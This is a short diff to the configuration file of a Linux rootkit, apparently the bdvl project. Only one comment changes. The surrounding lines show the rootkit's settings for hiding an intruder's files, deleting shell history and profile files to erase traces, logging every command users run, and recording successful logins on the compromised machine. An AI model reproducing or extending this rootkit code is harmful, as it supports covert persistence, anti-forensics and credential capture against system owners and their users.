@@ -57,7 +57,7 @@ GID_CHANGE_MINTIME = 60 * 30
 
 HIDE_MY_ASS      = True     # keep track of hidden things that don't belong to the rootkit. for example something created by you in /tmp. works recursively. initially was for rehiding upon a GID change.
 UNINSTALL_MY_ASS = True     # when running `./bdv uninstall`, bdvl will remove all of the hidden paths kept track of by HIDE_MY_ASS. also works recursively.
-CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when no rootkit processes are up.
+CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when not logged into the box. (when no rootkit processes or hidden ports are alive)
 
 LOG_USER_EXEC  = True          # log stuff executed by users. from the moment of installation. straight from the exec hooks.
 LOG_LOCAL_AUTH = True          # log successful auths for users on the box.
